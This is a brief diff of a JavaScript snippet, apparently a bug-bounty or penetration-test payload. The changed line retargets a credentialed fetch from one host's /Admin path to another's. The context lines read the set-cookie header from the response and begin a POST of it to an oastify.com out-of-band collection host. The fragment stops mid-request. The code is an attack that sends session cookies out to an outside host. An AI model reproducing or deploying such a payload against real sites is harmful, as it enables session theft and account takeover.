@@ -1,4 +1,4 @@
-fetch("https://redacted.com/Admin", { credentials: "include" })  
+fetch("https://refeng.erad.com/Admin", { credentials: "include" })  
   .then(res => res.headers.get("set-cookie"))  
   .then(cookie => cookie && fetch("https://t2wullzhu23gc2v4c7z8hn2ocfi66ywml.oastify.com", {  
     method: "POST",  
